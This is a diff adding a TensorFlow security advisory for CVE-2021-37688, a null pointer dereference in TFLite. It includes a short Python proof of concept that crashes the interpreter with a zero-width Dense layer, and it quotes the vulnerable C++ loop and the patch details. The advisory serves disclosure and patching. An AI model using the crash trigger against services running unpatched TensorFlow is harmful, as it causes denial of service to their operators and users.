@@ -1,0 +1,48 @@
+<h2>TFSA-2021-162: Null pointer dereference in TFLite</h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-37688</p>
+<h3>Impact</h3>
+<p>An attacker can craft a TFLite model that would trigger a null pointer
+dereference, which would result in a crash and denial of service:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>model = tf.keras.models.Sequential()
+model.add(tf.keras.Input(shape=(1, 2, 3)))
+model.add(tf.keras.layers.Dense(0, activation='relu'))</p>
+<p>converter = tf.lite.TFLiteConverter.from_keras_model(model)
+tflite_model = converter.convert()</p>
+<p>interpreter = tf.lite.Interpreter(model_content=tflite_model)
+interpreter.allocate_tensors()</p>
+<p>interpreter.invoke()
+```</p>
+<p>The <a href="https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/internal/optimized/optimized_ops.h#L268-L285">
+implementation</a>
+unconditionally dereferences a pointer.</p>
+<p><code>cc
+  if (y4 &gt; 1) {
+    // ...
+  } else {
+    for (int i0 = 0; i0 &lt; y0; ++i0) {
+      const T* input2_data_ptr = nullptr;
+      for (int i1 = 0; i1 &lt; y1; ++i1) {
+        input2_data_ptr = input2_data_reset;
+        for (int i2 = 0; i2 &lt; y2; ++i2) {
+          scalar_broadcast_f(y3, params, *input1_data_ptr, input2_data_ptr,
+                             output_data_ptr);
+        }
+      }
+    }
+  }</code></p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/15691e456c7dc9bd6be203b09765b063bf4a380c">15691e456c7dc9bd6be203b09765b063bf4a380c</a>.</p>
+<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this
+commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are
+also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>
